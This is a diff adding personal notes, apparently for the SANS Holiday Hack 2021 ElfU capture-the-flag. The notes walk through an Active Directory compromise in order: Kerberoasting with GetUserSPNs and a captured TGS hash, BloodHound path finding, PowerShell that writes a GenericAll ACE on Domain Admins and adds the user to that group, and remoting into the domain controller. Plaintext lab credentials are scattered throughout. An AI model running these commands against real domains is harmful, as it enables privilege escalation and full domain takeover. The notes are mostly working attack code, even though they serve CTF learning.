@@ -1,0 +1,168 @@
+Cradle to grave AD exploitation
+
+Kerberoasting
+	Tim Medin Talk: https://www.youtube.com/watch?v=Jaa2LmZaNeU
+	C# Kerberoasting Tool Rubeus: https://github.com/GhostPack/Rubeus
+	Invoke-Kerberoast (Powershel): https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+	GetUserSPNs.py by impacket: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+
+Bloodhound (AD Viewing/Recon)
+	Good Intro/How-To by Conda: https://www.youtube.com/watch?v=aJqjH3MsbLM
+	SharpHound (Powershell): https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+	SharpHound (C#): https://github.com/BloodHoundAD/SharpHound3
+
+Hashcat
+	https://hashcat.net/hashcat
+
+Powerview/Powersploit (AD Manipulation)
+	https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+	https://github.com/PowerShellMafia/PowerSploit
+
+Custom Code Snippets for Evading Endpoint Protections Demo'd in Talk
+	https://github.com/chrisjd20/hhc21_powershell_snippets
+
+Demo:
+	gci env:USERDNSDOMAIN
+
+ssh jlmsgkkobp@grades.elfu.org -p 2222
+
+ElfU Domain Username: jlmsgkkobp
+ElfU Domain Password: Wuqsdmsxa! -> P@$$w0rd!
+
+Import SharpHound (domain joined machine)
+
+	$PS> Import-Module .\SharpHound.ps1
+	$PS> Invoke-BloodHound -CollectionMethod All
+		<This will produce a zip file -- need to copy to local machine>
+
+On Local Machine
+	Import the collector db from above collection into bloodhound
+	Look at node info to look at domain users
+	Queries > Find Shortest Path to Domain Admins
+		List things that spring off of domain admins
+		Look for a user that has write Dacl perms on domain admins group (right click > help > abuse info)
+	Queries > List All Kerberoastable Accounts
+		Look at description
+
+On Domain Joined Machine
+	Find the domain controller
+	Use Get-UserSPNs from Impacket
+		Can user from any host that has network access
+		$PS> py -3 GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/dsoszvzoxp:P@$$w0rd! -reque
+			This will produce a file with the hash of a vulnerable account
+			Crack the hash use best64 rule set and rockyou.txt
+
+	Also Invoke-Kerberoasting script
+
+Login as enumerated account
+	$PS> runas /noprofile /user:<vulnerable_user>@elfu.local cmd
+		net view > find file share
+	$dir \\<filepath>\<share>
+	Copy potentially helpful files to local and look at them
+
+Local machine
+	Mark user as owned in Bloodhound
+	query Shortest Path From Owned Principals
+
+On Domain Joind Machine
+	Use enumerated account to give low priv user account domain admin
+	Verify that account has WriteDacl Perms
+	$PS> $ADSI = [ADSI] "LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
+	$PS> $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+
+	OR
+
+	$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
+	$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+	$domainDirEntry.get_ObjectSecurity().Access
+
+	This will query and will show the permissions	
+
+	To give self permissions
+	$PS> runas /noprofile /user:<enumerated_user>@elfu.local cmd
+
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
+$username = "jlmsgkkobp"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (
+	New-Object System.Security.Princiapl.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+	$IdentityReference,
+	([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"),
+	([System.Security.AccessControl.AccessControlType] "Allow"),
+	$propGUID, $inheritanceType, $nullGUID
+	)
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+	Verify that account has "Generic All"
+		$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
+		$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+		$domainDirEntry.get_ObjectSecurity().Access
+
+	Add self to group
+		 Add-Type -AssemblyName System.DirectoryServices
+		 $ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
+		 $username = "jlmsgkkobp"
+		 $password = "Wuqsdmsxa!"		
+		 $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+		 $user = New-Object System.Security.Principal.NTAccount("eluf.local\$username")
+		 $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+		 $b=New-Object byte[] $sid.BinaryLength
+		 $sid.GetBinaryForm($b,0)
+		 $hexSID=[BitConverter]::ToString($b).Replace('-','')
+		 $domainDirEntry.Add("LDAP://<SID=$hexSID>")
+		 $domainDirEntry.CommitChanges()
+		 $domainDirEntry.dispose()
+
+	Check to see if domain admin
+	net group "Domain Admins" /domain
+
+	Remote into Domain Controller
+	$PS> $password = ConvertTo-SecureString "P@$$w0rd!" -AsPlainText -Force
+		 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\dsoszvzoxp", $password)
+		 Enter-PSSession -ComputerName <Domain Controller>.elfu.local -Credential $creds -Authentication Negotiate
+
+Line 549 $Assembly = [Reflection.Assembly]::Load
+Line 552 $Assembly.GetType(Costura.AssemblyLoader, $false)
+Line 553 $Assembly.GetType("SharpHound3.SharpHound")
+
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$06558aee5fa00832b014440297fc97c7$8a71af65b9504f5822226d4104b9d9cd49373e4a2bd8ae0bc293e588766f30b42967be17e7eb8d2844dd7b3e2a13e662eb7b668fce7dfc94b93a9cc841e3d55bd33d551a82a1e830e54deb5a772e896f3c6456bec74ea7bfbdeb2d52af652b99812617538147a64d013ae435e0da4e21f5b892d57a6716e69f1d4773dcfcdcf592f83beee77fb7bc1c149059c2b705ffd64341688fe8da9e2d9fd27ecaae40a7673bea90f3f01483b86a3b5b1447a2c8f958eeed13cd6890b5a91e26c4357dd1565351f6d84d757570d9f56737b0996bca37352e51ade6c44fbdc27755cf96336a9f8ad01c4c73fd8915af6501ef6e888b541ff55d26d4947fd2c9eef14d8e1492a5b1abbf50ad356f335d43d494bd2fe4a3f6b5fc85c4d11a057a5df61ab331070914d5f8b99d810dfdcc22cad9fc1ceac4c2473d42408a31ace438f4ed2b9dedf60c07700fd9880ddf1cc1e665d4b840c93fe06474837326da61193af054f9bb43984d600ea4252cbdd15ebc45e7e288a73667d0702c1c66e0ec507231782d767346d83b839109584d0f08e566defc61227813147b60f156f2f8deb480243b6e9366859049adfa501842b22022308c16f7fa113029bd5505c5b12ca2cb6f91f6f48eb9e2808e7f0634200ef7d4fc095ed06011ae2afd90d988d47a9be9c3fbe665482246d92d24678a1fa4ad030f9faa01b21ed9823cd59495addca92b5919da2dc8b99ddb7fb0713c37efb0382d8054f6ba699852e02d200ba4a96752ae99422cf4ca8172ae4034bbf23751e6344a38cc15c2fe7cb6cede0f45907b398fb0fdcf4e1cbfa9c29ce102aace831dd4142633f5fb18022d029c74315c74cdd744440ba307cf41fa456a0acb6806a6655d789d3232ed4492a01c29ce051fc0ba552f5cdf0e9a72874910b85be929d3a07c625cca3dc78a2ef6dc1d25772716cbc38424486b4311bdf3b5c4df3f2367f47722f3bf6f1fbde67679226af84d34b88d0f2f0a9a67bb64667662d0149ee6c1c948b0f14164b70d0d0f7b6a2d9ff8d3f05e66037d2ec2677366947d97d3a6ffbe84c28011eb92b8085169b3d946cda059c48d4290d2b6dd840689b64c8a1d90363851fe7bedacdc22c013cfb4d12288bc09c1f56117043e7ab6ef6e976313890773b5276396f53de761996afb7ba629ed56ea4ab3b9947757e6c0be3963fc793b999582623947f8f8cd38ea810c2f71963fb670c8560cb7c65c90932647c4b92b31f0c70f800d419318fcbb86622a873830b2282de5e7d2c15a562fb089faa9938943fe251ad3c8dcb55c141a719a63517ba4e62ebc1e7331994e1da36d70b99e2c1c32517cc8a7dc53b632671baaf9ebc5ec68ca0b886458d06bdb0e208319b6b20516b016268e281b41c64d5d964626232d7b588fc6ad5824506ff3c79f5b0d27585b942a4a8e273a8cf11150d73af48d6a08fbf9
+
+DC -> 172.17.0.3 -- elfu_svc_shr; research_dep
+Other -> 172.17.0.4 -- has ElfUFiles share
+DC -> 10.128.1.53 actual DC?
+
+**elfu_svc:Snow2021!** --> grabbed from 10.128.1.53 \\\\172.17.0.3\\elfu_svc_shr -U elfu_svc
+**LabAdmin:LS1setup**
+**freddyk:P@ssword1**
+
+Use:
+	GetProcessInfo.ps1 --> edit script block to take commands for prive esc
+
+	Use GetProcessInfo.ps1 to save credentials as local variables
+	Then 
+	`PS $> Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate`
+
+	Domain Admins
+	Enterprise Admins
+	Administrators
+
+	scp jlmsgkkobp@grades.elfu.org:~/useMe/SantaSecretToAWonderfulHolidaySeason.pdf 
+
+
+
+~~~~~~~~~~~~~
+
+
+ssh fmmvtwesrh@grades.elfu.org -p 2222
+ElfU Domain Username: fmmvtwesrh
+ElfU Domain Password: Cfvbzenyy#
